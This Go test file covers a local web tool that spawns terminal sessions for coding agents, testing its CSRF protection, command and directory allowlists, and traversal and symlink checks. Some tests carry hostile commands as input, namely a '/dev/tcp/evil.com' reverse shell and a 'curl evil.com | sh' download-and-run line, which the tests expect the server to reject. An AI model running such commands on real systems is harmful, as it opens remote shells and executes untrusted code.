package main

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/gorilla/csrf"
)

func init() {
	// Enable spawn with test allowlists
	config = &Config{
		AllowedCommands:    []string{"claude", "codex", "echo"},
		AllowedDirectories: []string{"/tmp", "/Users/elle/code"},
	}
}

// csrfTestKey is a fixed 32-byte key for tests.
var csrfTestKey = []byte("test-key-must-be-32-bytes-long!!")

// newCSRFHandler wraps a handler with gorilla/csrf for testing.
// Uses Secure(false) since httptest doesn't use TLS.
func newCSRFHandler(handler http.Handler) http.Handler {
	return csrf.Protect(
		csrfTestKey,
		csrf.Secure(false),
		csrf.SameSite(csrf.SameSiteStrictMode),
		csrf.Path("/"),
	)(handler)
}

// getCSRFToken does a GET to the index page to extract a valid CSRF cookie + token pair.
func getCSRFToken(t *testing.T, handler http.Handler) (string, []*http.Cookie) {
	t.Helper()
	req := httptest.NewRequest("GET", "/", nil)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("GET /: expected 200, got %d", w.Code)
	}

	// Extract token from the hidden input: <input type="hidden" name="gorilla.csrf.Token" value="...">
	body := w.Body.String()
	marker := `name="gorilla.csrf.Token" value="`
	idx := strings.Index(body, marker)
	if idx == -1 {
		t.Fatalf("CSRF token field not found in response body")
	}
	start := idx + len(marker)
	end := strings.Index(body[start:], `"`)
	if end == -1 {
		t.Fatalf("CSRF token value not terminated")
	}
	token := body[start : start+end]

	return token, w.Result().Cookies()
}

// postWithCSRF makes a POST request with a valid CSRF token.
func postWithCSRF(t *testing.T, handler http.Handler, path string, form url.Values) *httptest.ResponseRecorder {
	t.Helper()
	token, cookies := getCSRFToken(t, handler)

	form.Set("gorilla.csrf.Token", token)
	req := httptest.NewRequest("POST", path, strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// Mark as plaintext HTTP so gorilla/csrf skips the Referer check.
	// (Secure(false) only affects cookie flags, not request classification.)
	req = csrf.PlaintextHTTPRequest(req)
	for _, c := range cookies {
		req.AddCookie(c)
	}

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)
	return w
}

// =============================================================================
// CSRF MIDDLEWARE INTEGRATION TESTS
// These verify that gorilla/csrf is correctly wired into the handler chain.
// =============================================================================

func TestCSRF_PostWithoutTokenRejected(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "echo")
	// No CSRF token

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("POST without CSRF token: expected 403, got %d", w.Code)
	}
}

func TestCSRF_PostWithWrongTokenRejected(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	// Get cookies from a GET request (to have valid cookie)
	_, cookies := getCSRFToken(t, handler)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "echo")
	form.Set("gorilla.csrf.Token", "wrong-token")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	for _, c := range cookies {
		req.AddCookie(c)
	}

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("POST with wrong CSRF token: expected 403, got %d", w.Code)
	}
}

func TestCSRF_PostWithValidTokenAccepted(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "echo")

	w := postWithCSRF(t, handler, "/spawn", form)

	// Should NOT be 403 — CSRF passed. May fail for other reasons (e.g. tmux not available)
	if w.Code == http.StatusForbidden {
		t.Errorf("POST with valid CSRF token: got 403 (body: %s)", w.Body.String())
	}
}

func TestCSRF_AllPostEndpointsProtected(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/connect/", handleConnect)
	mux.HandleFunc("/spawn", handleSpawn)
	mux.HandleFunc("/spawn-project", handleSpawn)
	mux.HandleFunc("/kill/", handleKill)
	handler := newCSRFHandler(mux)

	endpoints := []string{
		"/connect/test-session",
		"/spawn",
		"/spawn-project",
		"/kill/test-session",
	}

	for _, path := range endpoints {
		form := url.Values{}
		form.Set("dir", "/tmp")
		form.Set("cmd", "echo")
		form.Set("project", "test")

		req := httptest.NewRequest("POST", path, strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		w := httptest.NewRecorder()
		handler.ServeHTTP(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("POST %s without CSRF: expected 403, got %d", path, w.Code)
		}
	}
}

// --- POST Required (No GET Side Effects) ---

func TestGETNotAllowed(t *testing.T) {
	endpoints := []string{
		"/connect/test-session",
		"/spawn",
		"/spawn-project",
		"/kill/test-session",
	}

	for _, path := range endpoints {
		req := httptest.NewRequest("GET", path, nil)
		w := httptest.NewRecorder()

		switch {
		case strings.HasPrefix(path, "/connect/"):
			handleConnect(w, req)
		case path == "/spawn":
			handleSpawn(w, req)
		case path == "/spawn-project":
			handleSpawn(w, req)
		case strings.HasPrefix(path, "/kill/"):
			handleKill(w, req)
		}

		if w.Code != http.StatusMethodNotAllowed {
			t.Errorf("GET %s: expected 405, got %d", path, w.Code)
		}
	}
}

func TestOtherMethodsNotAllowed(t *testing.T) {
	methods := []string{"PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"}

	for _, method := range methods {
		req := httptest.NewRequest(method, "/spawn", nil)
		w := httptest.NewRecorder()
		handleSpawn(w, req)

		if w.Code != http.StatusMethodNotAllowed {
			t.Errorf("%s /spawn: expected 405, got %d", method, w.Code)
		}
	}
}

// =============================================================================
// SESSION VALIDATION TESTS
// =============================================================================

func TestConnectRejectsInvalidSession(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/connect/", handleConnect)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	w := postWithCSRF(t, handler, "/connect/fake-session-that-does-not-exist", form)

	if w.Code != http.StatusNotFound {
		t.Errorf("connect to fake session: expected 404, got %d", w.Code)
	}
}

func TestKillRejectsInvalidSession(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/kill/", handleKill)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	w := postWithCSRF(t, handler, "/kill/fake-session-that-does-not-exist", form)

	if w.Code != http.StatusNotFound {
		t.Errorf("kill fake session: expected 404, got %d", w.Code)
	}
}

// =============================================================================
// DIRECTORY / COMMAND VALIDATION TESTS
// =============================================================================

func TestSpawnRejectsNonexistentDirectory(t *testing.T) {
	_, err := spawnSession("/nonexistent/path/that/does/not/exist", "echo")
	if err == nil {
		t.Error("expected error for nonexistent directory")
	}
	if !strings.Contains(err.Error(), "directory not found") {
		t.Errorf("expected 'directory not found' error, got: %s", err)
	}
}

func TestSpawnRejectsFile(t *testing.T) {
	tmpFile, err := os.CreateTemp("", "test")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpFile.Name())
	tmpFile.Close()

	_, err = spawnSession(tmpFile.Name(), "echo")
	if err == nil {
		t.Error("expected error for file (not directory)")
	}
	if !strings.Contains(err.Error(), "not a directory") {
		t.Errorf("expected 'not a directory' error, got: %s", err)
	}
}

// =============================================================================
// ALLOWLIST TESTS
// =============================================================================

func TestAllowlist_CommandNotAllowed(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash") // Not in allowlist

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("disallowed command 'bash': expected 403, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("expected 'access denied' in response, got: %s", w.Body.String())
	}
}

func TestAllowlist_CommandAllowed(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "claude") // In allowlist

	w := postWithCSRF(t, handler, "/spawn", form)

	// Should not be rejected for command (might fail for other reasons like tmux)
	if w.Code == http.StatusForbidden && strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("allowed command 'claude' was rejected: %s", w.Body.String())
	}
}

func TestAllowlist_DirectoryNotAllowed(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/etc") // Not in allowlist
	form.Set("cmd", "claude")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("disallowed directory '/etc': expected 403, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("expected 'access denied' in response, got: %s", w.Body.String())
	}
}

func TestAllowlist_TraversalBlocked(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp/../etc") // Tries to escape to /etc
	form.Set("cmd", "claude")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("directory traversal should be blocked: got %d", w.Code)
	}
}

func TestAllowlist_ReverseShellBlocked(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("reverse shell command should be blocked: got %d", w.Code)
	}
}

func TestAllowlist_SpawnDisabledWithoutConfig(t *testing.T) {
	savedConfig := config
	config = nil
	defer func() { config = savedConfig }()

	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "claude")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("spawn without config should be blocked: got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("expected 'access denied' message, got: %s", w.Body.String())
	}
}

func TestIsCommandAllowed(t *testing.T) {
	tests := []struct {
		cmd      string
		expected bool
	}{
		{"claude", true},
		{"codex", true},
		{"echo", true},
		{"bash", false},
		{"sh", false},
		{"rm", false},
		{"curl", false},
		{"", false},
	}

	for _, tc := range tests {
		result := isCommandAllowed(tc.cmd)
		if result != tc.expected {
			t.Errorf("isCommandAllowed(%q) = %v, want %v", tc.cmd, result, tc.expected)
		}
	}
}

func TestIsDirectoryAllowed(t *testing.T) {
	tmpDir := t.TempDir()
	subDir := filepath.Join(tmpDir, "subdir")
	os.MkdirAll(subDir, 0755)

	savedConfig := config
	config = &Config{
		AllowedCommands:    []string{"claude", "codex", "echo"},
		AllowedDirectories: []string{tmpDir},
	}
	defer func() { config = savedConfig }()

	tests := []struct {
		dir      string
		expected bool
	}{
		{tmpDir, true},
		{subDir, true},
		{"/etc", false},
		{"/", false},
		{tmpDir + "/../etc", false}, // traversal
	}

	for _, tc := range tests {
		result := isDirectoryAllowed(tc.dir)
		if result != tc.expected {
			t.Errorf("isDirectoryAllowed(%q) = %v, want %v", tc.dir, result, tc.expected)
		}
	}
}

func TestIsDirectoryAllowed_SymlinkBypass(t *testing.T) {
	tmpDir := t.TempDir()
	outsideDir := t.TempDir()

	savedConfig := config
	config = &Config{
		AllowedCommands:    []string{"echo"},
		AllowedDirectories: []string{tmpDir},
	}
	defer func() { config = savedConfig }()

	symlink := filepath.Join(tmpDir, "escape")
	if err := os.Symlink(outsideDir, symlink); err != nil {
		t.Skipf("cannot create symlink: %v", err)
	}

	if isDirectoryAllowed(symlink) {
		t.Errorf("symlink %q -> %q should be rejected (resolves outside allowed directory)", symlink, outsideDir)
	}

	if !isDirectoryAllowed(tmpDir) {
		t.Errorf("allowed directory %q should be accepted", tmpDir)
	}
}

// =============================================================================
// FUNCTIONAL TESTS
// =============================================================================

func TestGenerateSessionName(t *testing.T) {
	name := generateSessionName("claude", "myproject")

	parts := strings.Split(name, "-")
	if len(parts) != 4 {
		t.Errorf("expected 4 parts, got %d: %s", len(parts), name)
	}
	if parts[0] != "claude" {
		t.Errorf("expected cmd 'claude', got '%s'", parts[0])
	}
	if parts[1] != "myproject" {
		t.Errorf("expected project 'myproject', got '%s'", parts[1])
	}

	foundAdj := false
	for _, adj := range adjectives {
		if adj == parts[2] {
			foundAdj = true
			break
		}
	}
	if !foundAdj {
		t.Errorf("adjective '%s' not in list", parts[2])
	}

	foundNoun := false
	for _, noun := range nouns {
		if noun == parts[3] {
			foundNoun = true
			break
		}
	}
	if !foundNoun {
		t.Errorf("noun '%s' not in list", parts[3])
	}
}

// =============================================================================
// REVERSE PROXY TESTS
// =============================================================================

func TestTerminalProxy_NoSessionReturns400(t *testing.T) {
	req := httptest.NewRequest("GET", "/terminal/", nil)
	w := httptest.NewRecorder()
	handleTerminal(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("empty session name: expected 400, got %d", w.Code)
	}
}

func TestTerminalProxy_UnknownSessionReturns404(t *testing.T) {
	req := httptest.NewRequest("GET", "/terminal/nonexistent-session/", nil)
	w := httptest.NewRecorder()
	handleTerminal(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("nonexistent session: expected 404, got %d", w.Code)
	}
}

func TestTerminalProxy_KnownSessionProxies(t *testing.T) {
	fakeHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Proxied", "true")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("fake ttyd response"))
	})
	fakeTtyd := httptest.NewServer(fakeHandler)
	defer fakeTtyd.Close()

	fakeTtydAddr := fakeTtyd.Listener.Addr().String()
	fakePort := 0
	fmt.Sscanf(fakeTtydAddr, "127.0.0.1:%d", &fakePort)
	if fakePort == 0 {
		fmt.Sscanf(fakeTtydAddr, "[::1]:%d", &fakePort)
	}
	if fakePort == 0 {
		t.Fatalf("cannot parse port from test server addr: %s", fakeTtydAddr)
	}

	portMutex.Lock()
	ttydInstances["test-proxy-session"] = &ttydInstance{port: fakePort, cmd: nil}
	portMutex.Unlock()
	defer func() {
		portMutex.Lock()
		delete(ttydInstances, "test-proxy-session")
		portMutex.Unlock()
	}()

	req := httptest.NewRequest("GET", "/terminal/test-proxy-session/", nil)
	w := httptest.NewRecorder()
	handleTerminal(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("proxy to fake ttyd: expected 200, got %d (body: %s)", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "fake ttyd response") {
		t.Errorf("proxy did not forward to fake ttyd, got: %s", w.Body.String())
	}
}

// =============================================================================
// ATTACK SIMULATIONS
// These verify that gorilla/csrf blocks real attack scenarios.
// =============================================================================

func TestAttack_CrossSiteSpawnReverseShell(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// No CSRF cookie or token — attacker can't read our page

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Cross-site reverse shell spawn returned %d, expected 403", w.Code)
	}
}

func TestAttack_HiddenFormAutoSubmit(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "curl evil.com | sh")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Hidden form CSRF returned %d, expected 403", w.Code)
	}
}

func TestAttack_ImgTagSpawnTtyd(t *testing.T) {
	req := httptest.NewRequest("GET", "/connect/claude-project-cozy-otter", nil)
	w := httptest.NewRecorder()
	handleConnect(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("ATTACK SUCCEEDED: img tag GET request returned %d, expected 405", w.Code)
	}
}

func TestAttack_KillAllSessions(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/kill/", handleKill)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	req := httptest.NewRequest("POST", "/kill/claude-project-happy-otter", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Session kill DoS returned %d, expected 403", w.Code)
	}
}
